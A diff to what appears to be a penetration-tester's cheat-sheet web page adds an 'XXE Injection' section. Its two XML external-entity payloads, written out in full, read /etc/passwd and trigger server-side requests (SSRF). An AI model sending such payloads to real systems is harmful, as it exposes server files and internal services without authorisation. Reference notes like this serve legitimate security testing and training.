@@ -1066,7 +1066,19 @@ layout: default
 	<ul>
 		<li>Typically not running PHP, but it is possible</li>
 	</ul>
+
+	<hr>
 	
+	<h2>XXE Injection</h2>
+
+	<li>File retrieval</li>
+
+	<pre>&#9;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#13;&#10;&#9;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&#13;&#10;&lt;container&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/container&gt;</pre>
+	
+	<li>SSRF</li>
+
+	<pre>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://website.com&quot;&gt; ]&gt;</pre>
+
 	<hr>
 	
 	<h2>Tomcat</h2>
